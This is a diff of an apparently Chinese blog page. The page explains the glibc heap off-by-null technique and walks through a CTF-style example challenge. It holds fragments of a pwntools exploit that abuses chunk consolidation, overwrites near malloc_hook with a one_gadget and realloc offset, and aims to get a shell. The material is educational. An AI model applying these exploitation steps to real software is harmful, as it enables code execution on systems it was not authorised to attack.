@@ -461,7 +461,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    807
+                    881
                 </div>
                 
 
@@ -492,7 +492,7 @@
 </ul>
 <hr>
 <h2 id="0x01-offbynull原理讲解"><a href="#0x01-offbynull原理讲解" class="headerlink" title="0x01 offbynull原理讲解"></a>0x01 offbynull原理讲解</h2><hr>
-<p>假设此时有四个0x100的堆块A、B、C、D：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/1.png"><br>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，此时的内存布局如下：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/2.png"><br>可以看到c的previnuse位被改成了0，也就是说，程序会将B看作已经被释放的堆块，但实际它并没有被释放。在这里，我们将其改成了0x200,也就是说定位到了A堆块。但是A堆块明明没有被free，这时候我们如果free C会出现异常。我们需要做的就是骗系统，绕过检查，其实我们需要做的仅仅就是先将A free掉<br>放入unsortedbin，这时候再free C，就会触发合并操作。触发合并操作后，ABC会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap。然后后续的操作也就和offbyone一样，通过overlap构造uaf，进而完成利用。</p>
+<p>假设此时有四个0x100的堆块A、B、C、D：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/1.png"><br>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，此时的内存布局如下：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/2.png"><br>可以看到c的previnuse位被改成了0，也就是说，程序会将B看作已经被释放的堆块，但实际它并没有被释放。在这里，我们将其改成了0x200,也就是说定位到了A堆块。但是A堆块明明没有被free，这时候我们如果free C会出现异常。我们需要做的就是骗系统，绕过检查，其实我们需要做的仅仅就是先将A free掉<br>放入unsortedbin，这时候再free C，就会触发合并操作。触发合并操作后，ABC会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap。然后后续的操作也就和offbyone一样，通过overlap构造uaf，进而完成利用。<br><strong>在实际运用时，不局限都是0x100的，可以是中间的某个堆块是fast chunk也行，但是第一个在头的必须得是unsorted chunk大小的堆块，否则无法触发合并。</strong></p>
 <h2 id="0x02-offbynull例题解析"><a href="#0x02-offbynull例题解析" class="headerlink" title="0x02 offbynull例题解析"></a>0x02 offbynull例题解析</h2><hr>
 <p>环境：本地 Ubuntu16.04<br>例题：<a href="/download/offbynull">offbynull</a></p>
 <hr>
@@ -538,7 +538,7 @@ realloc<span class="token operator">=</span>libc_base<span class="token operator
 fake_chunk<span class="token operator">=</span>malloc<span class="token operator">-</span><span class="token number">0x23</span>
 payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>
 free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
-add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x270</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#重新申请过3，因为漏洞出现在add</span>
+add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x270</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#重新申请过3，因为漏洞出现在add，如果在上面就这样申请，会发现不会成功get shell</span>
 free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#先释放1，否则报错</span>
 free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#1~4放入unsortbin</span>
 free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#将chunk 2放入fastbin</span>
@@ -1070,7 +1070,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">17k</span>&nbsp;字
+                class="white-color">17.1k</span>&nbsp;字
             
             
             
